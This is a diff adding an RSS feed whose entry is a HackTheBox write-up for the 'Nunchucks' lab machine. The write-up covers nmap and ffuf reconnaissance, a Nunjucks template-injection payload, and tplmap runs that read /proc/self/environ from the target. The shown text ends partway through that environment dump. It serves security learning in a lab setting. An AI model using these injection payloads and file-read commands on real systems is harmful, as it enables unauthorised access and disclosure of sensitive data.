@@ -1,0 +1,508 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Flask on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/flask/</link>
+    <description>Recent content in Flask on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 07 Nov 2021 01:42:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/flask/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Nunchuks</title>
+      <link>https://fahmifj.github.io/hackthebox/nunchuks/</link>
+      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/nunchuks/</guid>
+      <description>SSTI in Nunjucks and SUID capability on Perl</description>
+      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
+<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>SSTI on Nunjucks</li>
+<li>Creating tplmap middleware using Flask</li>
+<li>Exploiting <code>cap_setuid</code> on Perl</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Tplmap</li>
+<li>Flask</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ fscan 10.10.11.122 nunchucks
+nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.122
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
+443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Nunchucks - Landing Page
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
+<span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+<span class="p">|</span> Not valid before: 2021-08-30T15:42:24
+<span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+<span class="p">|</span> tls-nextprotoneg: 
+<span class="p">|</span>_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
+</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="http---https">HTTP -&gt; HTTPS</h3>
+<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ curl -I http://nunchucks.htb/ 
+HTTP/1.1 <span class="m">301</span> Moved Permanently
+Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
+Content-Type: text/html
+Content-Length: <span class="m">178</span>
+Connection: keep-alive
+Location: https://nunchucks.htb/
+</code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
+<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
+</p>
+<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
+</p>
+<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
+</p>
+<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
+</p>
+<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
+<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
+</p>
+<p>But then, the returned response states that registration is closed</p>
+<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
+</p>
+<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
+</p>
+<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
+</p>
+<p>Nothing else to try here.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+
+       v1.3.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://nunchucks.htb
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.nunchucks.htb
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>
+ :: Filter           : Response lines: <span class="m">547</span>
+________________________________________________
+
+store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
+:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
+<p>Store is not available, but I can subscribe for newsletter.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
+</p>
+<p>When I submit an email address there, it reflects the address back.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ssti">SSTI</h3>
+<h4 id="identify">Identify</h4>
+<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
+</p>
+<blockquote>
+<p>The email validation is on client-side.</p>
+</blockquote>
+<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
+<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
+<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.js</code>. Here&rsquo;s the code:</p>
+<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>
+
+<blockquote>
+<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
+</blockquote>
+<p>I&rsquo;ll run the middleware.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.46»
+$ python3 middleware.py
+ * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
+</code></pre></div><p>Then I will point the tplmap to my middleware.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
+</code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
+<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
+</p>
+<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:
+
+    --upload LOCAL REMOTE       Upload files to the server
+    --download REMOTE LOCAL     Download remote files
+</code></pre></div><p>Based on the <code>tplmap</code> results, it seemed that command execution is not possible.</p>
+<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
+<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
+</code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
+<span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
+<span class="s2">&#34;windowsHide&#34;</span>:true
+<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;treekill&#34;</span>:true
+<span class="s2">&#34;automation&#34;</span>:true
+<span class="s2">&#34;pmx&#34;</span>:true
+<span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
+<span class="s2">&#34;watch&#34;</span>:false
+<span class="s2">&#34;autorestart&#34;</span>:true
+<span class="s2">&#34;vizion&#34;</span>:true
+<span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
+<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
+<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
+<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
+<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
+<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
+<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
+<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
+<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
+<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
+<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
+<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
+<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
+<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
+<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
+<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
+<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
+<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
+<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
+<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
+<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
+<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
+<span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
+<span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
+<span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
+<span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
+<span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
+<span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
+<span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
+<span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
+<span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
+<span class="s2">&#34;km_link&#34;</span>:false
+<span class="s2">&#34;vizion_running&#34;</span>:false
+<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
+<span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
+<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
+<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
+<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
+<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
+<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
+<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
+<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
+<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
+<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
+<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
+<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
+<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
+<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
+<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
